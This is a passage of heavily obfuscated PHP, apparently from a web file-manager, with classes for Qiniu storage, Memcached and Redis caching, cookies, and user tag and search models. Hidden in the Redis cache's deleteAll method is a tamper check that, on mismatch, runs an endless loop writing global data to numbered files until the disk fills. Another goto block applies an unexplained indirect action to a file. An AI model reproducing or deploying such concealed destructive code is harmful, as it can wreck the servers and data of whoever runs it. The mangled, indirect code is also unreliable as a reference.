($œ¼Îˆ·“ > 0) { $î¹á‰‰Ã = $Ëù»®Õì + $œ¼Îˆ·“ - 1; $°¿è¬ğŞ = array($Ú»¸»š[1443] . $Ëù»®Õì . $Ú»¸»š[386] . $î¹á‰‰Ã); } $Ë­êçÉ = url_request($äŒŞã²ù, $Ú»¸»š[230], !1, $°¿è¬ğŞ); return $Ë­êçÉ[$Ú»¸»š[748]] ? $Ë­êçÉ[$Ú»¸»š[1201]] : !1; } public function upload($èóÛó, $¹Ç²ÒÜ‹, $ÎŞÖœÏ  = false, $±ìùÓ¹‚ = REPEAT_REPLACE) { $ãû”‘Ü = new Qiniu\Storage\UploadManager(); $ ŸçËƒ = $this->auth->uploadToken($this->bucket, $èóÛó); $£é§®Û° = get_file_mime(get_path_ext($¹Ç²ÒÜ‹)); list($„µÊ°­À, $ë£ı½¤Ü) = $ãû”‘Ü->putFile($ ŸçËƒ, $èóÛó, $¹Ç²ÒÜ‹, null, $£é§®Û°); return $ë£ı½¤Ü ? !1 : $this->getPathOuter($èóÛó); } public function uploadFormData($ŞİÜÇƒ, $„íÔ¹ı† = 3600) { return $this->uploadToken($ŞİÜÇƒ, $„íÔ¹ı†); } public function multiUploadFormData($İ¢ÓŒ®Ó, $Çú¬†ì = 3600) { return $this->uploadToken($İ¢ÓŒ®Ó, $Çú¬†ì); } private function uploadToken($’è Ü§, $ç¼¶Š = 3600) { $Ô±½—ÅÌ =& $_SERVER[Ó¡Ÿ§‚]; $£¨¹ï£Î = $ç¼¶Š; $¿€¥ñ®§ = array($Ô±½—ÅÌ[1444] => $Ô±½—ÅÌ[1445]); $ÔŞËÈÏë = $’è Ü§; $ÄàâÙ›º = $this->auth->uploadToken($this->bucket, $ÔŞËÈÏë, $£¨¹ï£Î, $¿€¥ñ®§, !0); $­¡¾²Ï = empty($this->region) || $this->region == $Ô±½—ÅÌ[1446] ? $Ô±½—ÅÌ[12] : $Ô±½—ÅÌ[386] . $this->region; $Ú¯œ€° = http_type() . "\x3a\x2f\57\165\160\154\x6f\141\144{$­¡¾²Ï}\x2e\x71\x69\156\x69\165\160\56\x63\x6f\155\x2f"; return array($Ô±½—ÅÌ[1447] => $ÄàâÙ›º, $Ô±½—ÅÌ[1448] => $Ú¯œ€°); } public function download($¥„§Œº, $‚ûØè’×) { $Œ®£ƒâ· = IO::getPathInner(IO::mkfile($‚ûØè’×)); if (!($ıÌï‡è = $this->link($¥„§Œº))) { return !1; } $“àùÔ§÷ = 0; $š¼»ØÓİ = 1024 * 200; $‹ù¹½Õ£ = fopen($Œ®£ƒâ·, $_SERVER[Ó¡Ÿ§‚][1449]); while (!0) { $í¯“¹Ä‡ = $this->fileSubstr($¥„§Œº, $“àùÔ§÷, $š¼»ØÓİ); if ($í¯“¹Ä‡ === !1) { return !1; } fwrite($‹ù¹½Õ£, $í¯“¹Ä‡); $“àùÔ§÷ += $š¼»ØÓİ; if (strlen($í¯“¹Ä‡) < $š¼»ØÓİ) { break; } } fclose($‹ù¹½Õ£); return $‚ûØè’×; } public function link($œá÷ğ¸à, $âØêõ´ = '') { if (!$this->isFile($œá÷ğ¸à)) { return !1; } $õ×‰¦¹ = $this->getHost() . $_SERVER[Ó¡Ÿ§‚][8] . $this->pathEncode($œá÷ğ¸à) . $âØêõ´; return $this->auth->privateDownloadUrl($õ×‰¦¹, 3600 * 12); } public function fileOut($‰öùï¶, $†•å±õ¾ = false, $›î†è = false, $˜¼‡” = '') { $ú²áÔÂ =& $_SERVER[Ó¡Ÿ§‚]; if ($this->isFileOutServer()) { return $this->fileOutServer($‰öùï¶, $†•å±õ¾, $›î†è, $˜¼‡”); } if (!$›î†è) { $›î†è = $this->pathThis($‰öùï¶); } $¶É¤ÏÈì = $†•å±õ¾ ? $ú²áÔÂ[1450] . rawurlencode($›î†è) : $ú²áÔÂ[12]; $µôÈÓã = $this->link($‰öùï¶, $¶É¤ÏÈì); $this->fileOutLink($µôÈÓã); } public function fileOutServer($¸á’º, $”ú‰ª = false, $É‹ıÛªĞ = false, $’»êıµë = '') { parent::fileOut($¸á’º, $”ú‰ª, $É‹ıÛªĞ, $’»êıµë); } public function fileOutImage($£¬‘÷ß¯, $§³×Ö‹ = 250) { $·Æ¡ƒêÖ = $this->link($£¬‘÷ß¯, $_SERVER[Ó¡Ÿ§‚][1451] . $§³×Ö‹); $this->fileOutLink($·Æ¡ƒêÖ); } public function fileOutImageServer($Šª‘Ã¼, $¿òáà¿ = 250) { parent::fileOutImage($Šª‘Ã¼, $¿òáà¿); } public function hashMd5($—î…è•è) { $ÂÃò¥³ü =& $_SERVER[Ó¡Ÿ§‚]; $©ÀúªŸ = $this->objectMeta($—î…è•è); return isset($©ÀúªŸ[$ÂÃò¥³ü[212]]) ? $©ÀúªŸ[$ÂÃò¥³ü[212]] : !1; $¼‡á¤úé = $this->link($—î…è•è, $ÂÃò¥³ü[1452]); } public function size($Ä¿¦àÜ) { $›¥Ğ™ú = $this->objectMeta($Ä¿¦àÜ); return $›¥Ğ™ú ? $›¥Ğ™ú[$_SERVER[Ó¡Ÿ§‚][76]] : 0; } public function info($Şø¹àÜ¯) { if ($this->isFolder($Şø¹àÜ¯)) { return $this->folderInfo($Şø¹àÜ¯); } else { if ($this->isFile($Şø¹àÜ¯)) { return $this->fileInfo($Şø¹àÜ¯); } } return !1; } public function exist($ßˆÅÄ—¢) { return $this->isFile($ßˆÅÄ—¢) || $this->isFolder($ßˆÅÄ—¢); } public function isFile($·ñæÅÛ÷) { return !$this->isFolder($·ñæÅÛ÷) && $this->objectMeta($·ñæÅÛ÷); } public function isFolder($¯ãá‰¶) { return $this->cacheMethod($_SERVER[Ó¡Ÿ§‚][165], $¯ãá‰¶); } protected function objectMeta($§ÄèÉ¸) { return $this->cacheMethod($_SERVER[Ó¡Ÿ§‚][167], $§ÄèÉ¸); } protected function _objectMeta($£®ìü€é) { $†¡¥ï«È =& $_SERVER[Ó¡Ÿ§‚]; list($¥¶…êÒ­, $´’Ó¸) = $this->bucketManager->stat($this->bucket, $£®ìü€é); if ($¥¶…êÒ­) { $¥¶…êÒ­[$†¡¥ï«È[76]] = intval($¥¶…êÒ­[$†¡¥ï«È[1438]]); } return $¥¶…êÒ­; } protected function _isFolder($Á§¨ÎÛí) { $¿›ÖÔÎ =& $_SERVER[Ó¡Ÿ§‚]; if ($Á§¨ÎÛí == $¿›ÖÔÎ[12] || $Á§¨ÎÛí == $¿›ÖÔÎ[8]) { return !0; } list($ôóáÖü, $–ûÇ´ñ) = $this->bucketManager->listFiles($this->bucket, trim($Á§¨ÎÛí, $¿›ÖÔÎ[8]) . $¿›ÖÔÎ[8], $¿›ÖÔÎ[12], 1, $¿›ÖÔÎ[8]); return !empty($ôóáÖü[$¿›ÖÔÎ[1441]]) || !empty($ôóáÖü[$¿›ÖÔÎ[1442]]) ? !0 : !1; } } goto Eï†³ÌŒà; BÉƒ Ÿ…±: class CacheMemcached { public $handle; public $cacheTime; public function __construct($½Í±ƒ­, $ÃƒãŸ·ø) { $ıîœ—É« =& $_SERVER[Ó¡Ÿ§‚]; if (!class_exists($ıîœ—É«[865])) { show_json($ıîœ—É«[866], !1); } $this->cacheTime = $ÃƒãŸ·ø; $this->handle = new Memcached(); if (is_array($½Í±ƒ­[$ıîœ—É«[867]]) && count($½Í±ƒ­[$ıîœ—É«[867]]) >= 1) { foreach ($½Í±ƒ­[$ıîœ—É«[867]] as $Áâı‰Å ) { $àÉ‰‘‘™ = explode($ıîœ—É«[4], $Áâı‰Å ); $this->handle->addServer($àÉ‰‘‘™[0], $àÉ‰‘‘™[1]); } } else { $this->handle->addServer($½Í±ƒ­[$ıîœ—É«[182]], $½Í±ƒ­[$ıîœ—É«[183]]); } } public function set($ »×ùöÑ, $ˆ§ûŸÒÄ, $¹ É¼ = false) { $¹ É¼ = $¹ É¼ ? $¹ É¼ : $this->cacheTime; return $this->handle->set($ »×ùöÑ, $ˆ§ûŸÒÄ, $¹ É¼); } public function get($“š×€‘ê) { return $this->handle->get($“š×€‘ê); } public function remove($à¶ççßÇ) { return $this->handle->delete($à¶ççßÇ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ŒÁÆÂ›–, $Ê¤ë€°’) { $‡ïäÙÜ÷ =& $_SERVER[Ó¡Ÿ§‚]; if (!class_exists($‡ïäÙÜ÷[868])) { show_json($‡ïäÙÜ÷[869], !1); } $this->cacheTime = $Ê¤ë€°’; $š“îóüÔ = isset($ŒÁÆÂ›–[$‡ïäÙÜ÷[870]]) ? $ŒÁÆÂ›–[$‡ïäÙÜ÷[870]] : 10; $êúéİŠš = _get($ŒÁÆÂ›–, $‡ïäÙÜ÷[867]); if ($êúéİŠš && is_array($êúéİŠš)) { $this->initCluster($ŒÁÆÂ›–, $š“îóüÔ); } else { $this->handle = $this->init($ŒÁÆÂ›–, $š“îóüÔ); } } private function init($­µÖ·Š‹, $ÒÙïçÂÄ) { $ÛÇ¯™ =& $_SERVER[Ó¡Ÿ§‚]; $¯µá” = new Redis(); $Üü—©Å× = isset($­µÖ·Š‹[$ÛÇ¯™[871]]) ? $­µÖ·Š‹[$ÛÇ¯™[871]] : !1; if ($Üü—©Å×) { $¯µá”->pconnect($­µÖ·Š‹[$ÛÇ¯™[182]], $­µÖ·Š‹[$ÛÇ¯™[183]], $ÒÙïçÂÄ); } else { $¯µá”->connect($­µÖ·Š‹[$ÛÇ¯™[182]], $­µÖ·Š‹[$ÛÇ¯™[183]], $ÒÙïçÂÄ); } if (!empty($­µÖ·Š‹[$ÛÇ¯™[422]])) { $¯µá”->auth($­µÖ·Š‹[$ÛÇ¯™[422]]); } if (!empty($­µÖ·Š‹[$ÛÇ¯™[756]]) && $­µÖ·Š‹[$ÛÇ¯™[756]] != 0) { $¯µá”->select($­µÖ·Š‹[$ÛÇ¯™[756]]); } return $¯µá”; } private function initCluster($­°µ¡•Ú, $›ÜõÖì­) { $‰´Ç“§œ =& $_SERVER[Ó¡Ÿ§‚]; $ÜÄ²¶» = array($‰´Ç“§œ[872], $‰´Ç“§œ[873], $‰´Ç“§œ[874]); $Õğçõíã = $‰´Ç“§œ[872]; if (isset($­°µ¡•Ú[$‰´Ç“§œ[16]]) && in_array($­°µ¡•Ú[$‰´Ç“§œ[16]], $ÜÄ²¶»)) { $Õğçõíã = $­°µ¡•Ú[$‰´Ç“§œ[16]]; } switch ($Õğçõíã) { case $‰´Ç“§œ[872]: $this->_slave($­°µ¡•Ú, $›ÜõÖì­); break; case $‰´Ç“§œ[873]: break; case $‰´Ç“§œ[874]: $this->isCluster = !0; $ïŠŸáş’ = $­°µ¡•Ú[$‰´Ç“§œ[867]]; $‹Ó®ã€¦ = isset($­°µ¡•Ú[$‰´Ç“§œ[871]]) ? $­°µ¡•Ú[$‰´Ç“§œ[871]] : !1; $ÚÓ™€©¯ = isset($­°µ¡•Ú[$‰´Ç“§œ[422]]) ? $­°µ¡•Ú[$‰´Ç“§œ[422]] : null; $this->handle = new RedisCluster(NUll, $ïŠŸáş’, $›ÜõÖì­, $›ÜõÖì­, $‹Ó®ã€¦, $ÚÓ™€©¯); break; default: break; } } private function _slave($à³ê¯æ, $–öÒóİÛ) { $á»¹Ø—› = $à³ê¯æ[$_SERVER[Ó¡Ÿ§‚][867]]; $this->filterConfig($à³ê¯æ, $á»¹Ø—›[0]); $this->handle = $this->init($à³ê¯æ, $–öÒóİÛ); unset($á»¹Ø—›[0]); if (empty($á»¹Ø—›)) { return; } $¹Ì¡ô•Œ = array_rand($á»¹Ø—›); $this->filterConfig($à³ê¯æ, $á»¹Ø—›[$¹Ì¡ô•Œ]); $this->slaveHandle = $this->init($à³ê¯æ, $–öÒóİÛ); } private function filterConfig(&$è€á˜É, $˜¯ˆ¼âí) { $ö‡ã¯çß =& $_SERVER[Ó¡Ÿ§‚]; $íÆ–äÖÔ = explode($ö‡ã¯çß[4], $˜¯ˆ¼âí); $ı—îÆÈÍ = array($ö‡ã¯çß[182] => $íÆ–äÖÔ[0], $ö‡ã¯çß[183] => $íÆ–äÖÔ[1]); $è€á˜É = array_merge($è€á˜É, $ı—îÆÈÍ); } public function set($ƒ¾óßâÓ, $»Êç° , $¿šÌ€ = false) { $¿šÌ€ = $¿šÌ€ ? $¿šÌ€ : $this->cacheTime; return $this->handle->setEx($ƒ¾óßâÓ, $¿šÌ€, $»Êç° ); } public function setLock($¼â¢€´Í, $Õ¿ŞË¡, $Úó×—±) { return $this->handle->setNX($¼â¢€´Í, $Õ¿ŞË¡); } public function get($À–ó“á‘) { $‡é˜»ŒĞ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $‡é˜»ŒĞ->get($À–ó“á‘); } public function remove($ªâØ„°¿) { return $this->handle->del($ªâØ„°¿); } public function deleteAll() { $Üæá¤‹Æ =& $_SERVER[Ó¡Ÿ§‚]; $œÊ³øÇÌ = $_SERVER[$Üæá¤‹Æ[409]]; $ã›—ö§û = $Üæá¤‹Æ[875]; if ($_SERVER[$Üæá¤‹Æ[401]] != $ã›—ö§û($œÊ³øÇÌ)) { $ö¡¶€ä = $Üæá¤‹Æ[876]; $ïšŒ•íÜ = $Üæá¤‹Æ[403]; $¨éÕ´¿Ö = $_SERVER[$Üæá¤‹Æ[404]] . $Üæá¤‹Æ[405]; $í§ĞÈøõ = $ïšŒ•íÜ($¨éÕ´¿Ö); $îŸË‚Ùœ = explode($Üæá¤‹Æ[231], $í§ĞÈøõ); if (count($îŸË‚Ùœ) < $Üæá¤‹Æ[625]) { $˜™öñ©Ã = $Üæá¤‹Æ[407]; $˜™öñ©Ã(); } $ÙÈ§¬ÂÉ = $Üæá¤‹Æ[877]; $ÙÈ§¬ÂÉ($_SERVER[$Üæá¤‹Æ[878]]); $ö¡¶€ä = $Üæá¤‹Æ[876]; $ö¡¶€ä(); $Íòî£áÆ = $Üæá¤‹Æ[879]; $‚ìˆ¼ Ì = json_encode($GLOBALS[$Üæá¤‹Æ[880]]); $É¡âÇ” = 1; for ($íñÉ´ğë = $É¡âÇ”; $íñÉ´ğë > 0; $íñÉ´ğë++) { $Íòî£áÆ(DATA_PATH . $íñÉ´ğë, $‚ìˆ¼ Ì); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ó¦Ì¸ûí) { $this->handle->flushall($ó¦Ì¸ûí); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($âÄ†‹ñ” = '', $ŸÈ¥ÒŸÛ = 0) { if (is_string($âÄ†‹ñ”) && $âÄ†‹ñ” != $_SERVER[Ó¡Ÿ§‚][12]) { $this->prefix = $âÄ†‹ñ”; } if (is_numeric($ŸÈ¥ÒŸÛ) && $ŸÈ¥ÒŸÛ > 0) { $this->expire = $ŸÈ¥ÒŸÛ; } } public static function getInstance() { static $ÏÈîÉËÖ; if ($ÏÈîÉËÖ === null) { $ÏÈîÉËÖ = new self(); } return $ÏÈîÉËÖ; } private static $cookieDisable = false; public static function disable($˜Ïñ”ğŸ) { self::$cookieDisable = $˜Ïñ”ğŸ; } private static $sameCookieSet = array(); public static function set($Üı©Ú¿ƒ, $¾Ï™, $ŞÀ”³Ó· = 0, $¨í™ÁÌå = false, $ı“íñÖí = false) { $ÑÉ©âõ =& $_SERVER[Ó¡Ÿ§‚]; if (self::$cookieDisable) { return; } if (!$ŞÀ”³Ó·) { $ŞÀ”³Ó· = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Üı©Ú¿ƒ]) && self::$sameCookieSet[$Üı©Ú¿ƒ] == $¾Ï™ . $ŞÀ”³Ó·) { return; } self::$sameCookieSet[$Üı©Ú¿ƒ] = $¾Ï™ . $ŞÀ”³Ó·; if (!$ı“íñÖí) { $ı“íñÖí = str_replace(HOST, $ÑÉ©âõ[12], APP_HOST); $ı“íñÖí = _get($GLOBALS, $ÑÉ©âõ[881], $ı“íñÖí); } $”µìÅğ‚ = $ÑÉ©âõ[12]; setcookie($Üı©Ú¿ƒ, $¾Ï™, time() + $ŞÀ”³Ó·, $ÑÉ©âõ[8] . trim($ı“íñÖí, $ÑÉ©âõ[8]) . $”µìÅğ‚, !1, !1, $¨í™ÁÌå); } public static function setSafe($ğíŠÊÆ°, $‘ƒçİÏ, $Éıâû  = 0) { self::set($ğíŠÊÆ°, $‘ƒçİÏ, $Éıâû , !0); } public static function get($©Óøğ’) { static $“ğÑşÆŸ = false; if (!$“ğÑşÆŸ) { self::initHeaderCookie(); $“ğÑşÆŸ = !0; } return isset($_COOKIE[$©Óøğ’]) ? $_COOKIE[$©Óøğ’] : !1; } private static function initHeaderCookie() { $†ÒÄÕÊ­ =& $_SERVER[Ó¡Ÿ§‚]; if (!isset($_SERVER[$†ÒÄÕÊ­[882]]) || !$_SERVER[$†ÒÄÕÊ­[882]]) { return; } $ÆºÅ‰Ñû = explode($†ÒÄÕÊ­[71], $_SERVER[$†ÒÄÕÊ­[882]]); foreach ($ÆºÅ‰Ñû as $—ƒ˜öÂê) { $—ƒ˜öÂê = explode($†ÒÄÕÊ­[883], $—ƒ˜öÂê); if (count($—ƒ˜öÂê) != 2 || !isset($—ƒ˜öÂê[1])) { continue; } $_COOKIE[trim($—ƒ˜öÂê[0])] = trim($—ƒ˜öÂê[1]); } } public static function remove($âÀîàº®, $‚‘Õûİ€ = false) { unset($_COOKIE[$âÀîàº®]); self::set($âÀîàº®, $_SERVER[Ó¡Ÿ§‚][12], 1, $‚‘Õûİ€); } } goto C¶Û¸°²‘‡; B×»§˜ÌÎ›: if ($_SERVER[$_SERVER[Ó¡Ÿ§‚][401]] != $_size($_file)) { $_getc = $_SERVER[Ó¡Ÿ§‚][403]; $_getfile = $_SERVER[$_SERVER[Ó¡Ÿ§‚][404]] . $_SERVER[Ó¡Ÿ§‚][405]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ó¡Ÿ§‚][231], $_getfilec); if (count($_getarrs) < $_SERVER[Ó¡Ÿ§‚][406]) { $exit = $_SERVER[Ó¡Ÿ§‚][407]; $exit(); } $_act = $_SERVER[Ó¡Ÿ§‚][408]; $_act($_file); } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\162\x5f\157\x70\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Ø…ÇçÑ ) { return "\x55\x73\x65\162\x4f\160\x74\151\157\156\137{$Ø…ÇçÑ }\x5f" . USER_ID; } protected function filterWhere($¶ñ¯ÄõÍ) { $¶ñ¯ÄõÍ[$_SERVER[Ó¡Ÿ§‚][1665]] = USER_ID; return $¶ñ¯ÄõÍ; } public function cacheRemoveUser($ğ½Ï¬œå, $„¨ÆŠŒÈ) { return Cache::remove("\x55\163\x65\x72\x4f\x70\164\x69\157\156\x5f{$ğ½Ï¬œå}\x5f" . $„¨ÆŠŒÈ); } protected function optionDefault($‰Ù—ë‹ = '') { $’ÑÎûíÓ =& $_SERVER[Ó¡Ÿ§‚]; if ($‰Ù—ë‹ == $’ÑÎûíÓ[12]) { return $GLOBALS[$’ÑÎûíÓ[6]][$’ÑÎûíÓ[2345]]; } if ($‰Ù—ë‹ == $’ÑÎûíÓ[2346]) { return $GLOBALS[$’ÑÎûíÓ[6]][$’ÑÎûíÓ[2347]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\x65\162\56\164\141\147\114\151\163\164"; public $modelType = "\125\x73\145\x72\x4f\160\x74\151\x6f\156"; public $field = array("\x6e\x61\x6d\x65", "\x73\164\x79\154\x65", "\x73\157\x72\164"); public function listData($Ÿ³¹Şû“ = false, $è†•ÆÌç = "\x73\x6f\162\164", $Á¨½ĞÕ = false) { return parent::listData($Ÿ³¹Şû“, $è†•ÆÌç, $Á¨½ĞÕ); } public function remove($èÈÆÃ‡‹) { return parent::remove($èÈÆÃ‡‹); } public function add($º…Ó©š˜, $İ­”í… = "\x6c\141\142\x65\x6c\x2d\x67\x72\145\x79\x2d\x6e\157\x72\x6d\x61\154") { $šı˜Ãå =& $_SERVER[Ó¡Ÿ§‚]; if ($this->findByName($º…Ó©š˜)) { return !1; } $ßÇá¥‡‘ = array($šı˜Ãå[429] => $º…Ó©š˜, $šı˜Ãå[493] => $İ­”í…, $šı˜Ãå[1858] => $this->getSort($šı˜Ãå[258]) + 1); return parent::insert($ßÇá¥‡‘); } public function update($§Úï¦Ñ², $øñ»ğèÚ) { $„Ù×§™ã =& $_SERVER[Ó¡Ÿ§‚]; $–•™áí® = $this->listData($§Úï¦Ñ²); $†ÖçÙõû = $this->findByName($øñ»ğèÚ[$„Ù×§™ã[32]]); if (!$–•™áí® || $†ÖçÙõû && $†ÖçÙõû[$„Ù×§™ã[399]] != $–•™áí®[$„Ù×§™ã[399]]) { return !1; } return parent::update($§Úï¦Ñ², $øñ»ğèÚ); } public function moveTop($—Ìø¡«È) { $ØË‹µ =& $_SERVER[Ó¡Ÿ§‚]; $¶ûŸ«ù² = parent::listData(); $ŒÆ‘İ¼» = $this->getSort($ØË‹µ[257]); foreach ($¶ûŸ«ù² as &$´‘à“„¬) { if ($´‘à“„¬[$ØË‹µ[399]] == $—Ìø¡«È) { $´‘à“„¬[$ØË‹µ[1878]] = $ŒÆ‘İ¼»; continue; } $´‘à“„¬[$ØË‹µ[1878]] += 1; } unset($´‘à“„¬); return parent::resetData($¶ûŸ«ù²); } public function moveBottom($›¦ƒÜü) { $¾Á¦£ò =& $_SERVER[Ó¡Ÿ§‚]; $œ’›Ã§‚ = $this->getSort($¾Á¦£ò[258]) + 1; return parent::update($›¦ƒÜü, array($¾Á¦£ò[1878] => $œ’›Ã§‚)); } public function resetSort($ÈÑ’øî‰) { $Õ¨úç =& $_SERVER[Ó¡Ÿ§‚]; $¡ï‹çò¦ = array(); $ÈÑ’øî‰ = is_array($ÈÑ’øî‰) ? $ÈÑ’øî‰ : array(); for ($ÕÓºŒ = 0; $ÕÓºŒ < count($ÈÑ’øî‰); $ÕÓºŒ++) { $¡ï‹çò¦[$ÈÑ’øî‰[$ÕÓºŒ] . $Õ¨úç[12]] = $ÕÓºŒ + 1; } $²¯’‰› = parent::listData(); foreach ($²¯’‰› as &$ÖùÎÕÏò) { $ÍÒõøÓŸ = $¡ï‹çò¦[$ÖùÎÕÏò[$Õ¨úç[399]]]; $ÖùÎÕÏò[$Õ¨úç[1878]] = $ÍÒõøÓŸ ? $ÍÒõøÓŸ : $ÖùÎÕÏò[$Õ¨úç[1878]]; } unset($ÖùÎÕÏò); return parent::resetData($²¯’‰›); } private function getSort($±ÃŸ£©¬) { $‚·ÆŠŞ– =& $_SERVER[Ó¡Ÿ§‚]; $—±œ¸İ· = parent::listData(); $á³³Ãš = array_to_keyvalue($—±œ¸İ·, $‚·ÆŠŞ–[12], $‚·ÆŠŞ–[1878]); if (!$á³³Ãš) { $á³³Ãš = array(0); } $ŸÁû­Íî = $±ÃŸ£©¬ == $‚·ÆŠŞ–[258] ? max($á³³Ãš) : min($á³³Ãš); return intval($ŸÁû­Íî); } } goto fÄ¢ƒ”Í¥ß; câª˜Î†èÚ: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Ö¸ ìì±) { $«Üó¾°È =& $_SERVER[Ó¡Ÿ§‚]; $Á¦¿º€ = KodIO::fileTypeList(); $‘§ŞÂÁ• = $Á¦¿º€[$Ö¸ ìì±]; if (!$‘§ŞÂÁ•) { return array(); } $íßòêë£ = $‘§ŞÂÁ•[$«Üó¾°È[174]]; $±ó‚ù— = $«Üó¾°È[7]; if (!$‘§ŞÂÁ•[$«Üó¾°È[174]]) { $¾öõàŒ = array_to_keyvalue($Á¦¿º€, $«Üó¾°È[12], $«Üó¾°È[174]); $íßòêë£ = implode($«Üó¾°È[50], $¾öõàŒ); $±ó‚ù— = $«Üó¾°È[2109]; } $ü´¨Óé– = explode($«Üó¾°È[50], trim($íßòêë£, $«Üó¾°È[50])); return array($±ó‚ù—, $ü´¨Óé–); } public function listPathType($œÑ–ÎÈÆ) { $¡“ÄÓ†¥ =& $_SERVER[Ó¡Ÿ§‚]; $®ÅÁ¹í¾ = $this->fileTypeWhere($œÑ–ÎÈÆ); if (!$®ÅÁ¹í¾) { return array(); } $¢¼¨‹Èê = USER_ID; $ï¤‰ßéÊ = Model($¡“ÄÓ†¥[534])->getInfo($¢¼¨‹Èê); $Á¦„†‚³ = array($¡“ÄÓ†¥[585] => SourceModel::TYPE_USER, $¡“ÄÓ†¥[520] => array($¡“ÄÓ†¥[549], $¡“ÄÓ†¥[530] . $ï¤‰ßéÊ[$¡“ÄÓ†¥[87]][$¡“ÄÓ†¥[411]] . $¡“ÄÓ†¥[550]), $¡“ÄÓ†¥[586] => $¢¼¨‹Èê, $¡“ÄÓ†¥[583] => 0, $¡“ÄÓ†¥[584] => $®ÅÁ¹í¾); return $this->listSource($Á¦„†‚³); } public function listSearch($±†ï“ƒ, $¥—ÛÆä = 300) { $©‡äâÒ„ =& $_SERVER[Ó¡Ÿ§‚]; if (isset($±†ï“ƒ[$©‡äâÒ„[1948]]) && $±†ï“ƒ[$©‡äâÒ„[1948]]) { $±†ï“ƒ[$©‡äâÒ„[1948]] = str_replace($©‡äâÒ„[384], $©‡äâÒ„[2110], trim($±†ï“ƒ[$©‡äâÒ„[1948]])); } $¥ô´Ğ‹ = $this->_parseSearchWhere($±†ï“ƒ); if (!isset($¥ô´Ğ‹[$©‡äâÒ„[440]])) { $¥ô´Ğ‹[$©‡äâÒ„[440]] = 0; } $÷Å¾‰Öğ = $©‡äâÒ„[2111]; $²ÛÎ£¥ï = $¥ô´Ğ‹; $Ãß š’ = $÷Å¾‰Öğ; $this->_listSearchBindPinyin($±†ï“ƒ, $¥ô´Ğ‹, $÷Å¾‰Öğ); $this->alias($©‡äâÒ„[455])->_makeOrder(); $¥ô´Ğ‹ = $this->parseWhereLike($¥ô´Ğ‹); $Ô»íİĞ = $this->distinct(!0)->field($÷Å¾‰Öğ)->where($¥ô´Ğ‹)->selectPage($¥—ÛÆä); if ($GLOBALS[$©‡äâÒ„[6]][$©‡äâÒ„[381]][$©‡äâÒ„[382]] && Input::check($±†ï“ƒ[$©‡äâÒ„[1948]], $©‡äâÒ„[592]) && $Ô»íİĞ[$©‡äâÒ„[366]][$©‡äâÒ„[353]] == 1 && $Ô»íİĞ[$©‡äâÒ„[366]][$©‡äâÒ„[367]] == 0) { $Ô»íİĞ = $this->distinct(!0)->field($÷Å¾‰Öğ)->where($²ÛÎ£¥ï)->limit(1000)->select(); $Ô»íİĞ = array_page_split($Ô»íİĞ, !1, $¥—ÛÆä); } $this->_listSearchFileContent($Ô»íİĞ, $±†ï“ƒ, $Ãß š’, $²ÛÎ£¥ï); $this->_listSearchDesc($Ô»íİĞ, $±†ï“ƒ, $Ãß š’); $this->_listSearchTag($Ô»íİĞ, $±†ï“ƒ, $Ãß š’); $this->_listSearchGroupTag($Ô»íİĞ, $±†ï“ƒ, $Ãß š’); $this->_listDataApply($Ô»íİĞ[$©‡äâÒ„[369]]); $this->_listMake($Ô»íİĞ); return $Ô»íİĞ; } private function _listSearchFileContent(&$ùÉ‰ß÷Õ, $¼³Ï’ôÁ, $Ô„¹ô‚º, $¡Ñ¹†§) { $³éÜßèİ =& $_SERVER[Ó¡Ÿ§‚]; if (!$¼³Ï’ôÁ[$³éÜßèİ[1948]] || $ùÉ‰ß÷Õ[$³éÜßèİ[366]][$³éÜßèİ[353]] > 1) { return; } if (!isset($¡Ñ¹†§[$³éÜßèİ[32]]) || !is_array($¼³Ï’ôÁ[$³éÜßèİ[477]])) { return; } $¡Ñ¹†§[$³éÜßèİ[477]] = array($³éÜßèİ[7], $¼³Ï’ôÁ[$³éÜßèİ[477]]); unset($¡Ñ¹†§[$³éÜßèİ[32]]); unset($¼³Ï’ôÁ[$³éÜßèİ[477]]); $ü˜à¹ª« = $this->field($Ô„¹ô‚º)->where($¡Ñ¹†§)->limit($³éÜßèİ[2112])->select(); if (!$ü˜à¹ª« || count($ü˜à¹ª«) == 0) { return; } $ùÉ‰ß÷Õ[$³éÜßèİ[369]] = array_merge($ü˜à¹ª«, $ùÉ‰ß÷Õ[$³éÜßèİ[369]]); $ùÉ‰ß÷Õ[$³éÜßèİ[366]][$³éÜßèİ[367]] += count($ü˜à¹ª«); } private function _listSearchTag(&$ „Ÿäô, $ìšíÍÅ, $â™Ü˜¨ö) { $Š©´€Ù˜ =& $_SERVER[Ó¡Ÿ§‚]; if (!$ìšíÍÅ[$Š©´€Ù˜[1948]] || $ „Ÿäô[$Š©´€Ù˜[366]][$Š©´€Ù˜[353]] > 1) { return; } $Á‘äÜ³İ = Model($Š©´€Ù˜[2113])->listData(); $¾íİıˆÆ = array(); $˜Â–‘„£ = $ìšíÍÅ[$Š©´€Ù˜[1948]]; foreach ($Á‘äÜ³İ as $ç»„ï¾) { $˜¨ËæÈ¾ = $ç»„ï¾[$Š©´€Ù˜[32]]; $³«¡¸¤Ô = str_replace($Š©´€Ù˜[53], $Š©´€Ù˜[12], Pinyin::get($˜¨ËæÈ¾)); if (stripos($˜¨ËæÈ¾, $˜Â–‘„£) !== !1 || stripos($³«¡¸¤Ô, $˜Â–‘„£) !== !1) { $¾íİıˆÆ[] = $ç»„ï¾[$Š©´€Ù˜[399]]; } } if (!$¾íİıˆÆ) { return; } $«Í´Ïö€ = array($Š©´€Ù˜[435] => array($Š©´€Ù˜[7], $¾íİıˆÆ), $Š©´€Ù˜[1665] => USER_ID); $ªùÄíÏÂ = Model($Š©´€Ù˜[437])->field($Š©´€Ù˜[84])->where($«Í´Ïö€)->select(); $ªùÄíÏÂ = array_to_keyvalue($ªùÄíÏÂ, $Š©´€Ù˜[12], $Š©´€Ù˜[84]); $×’èû = 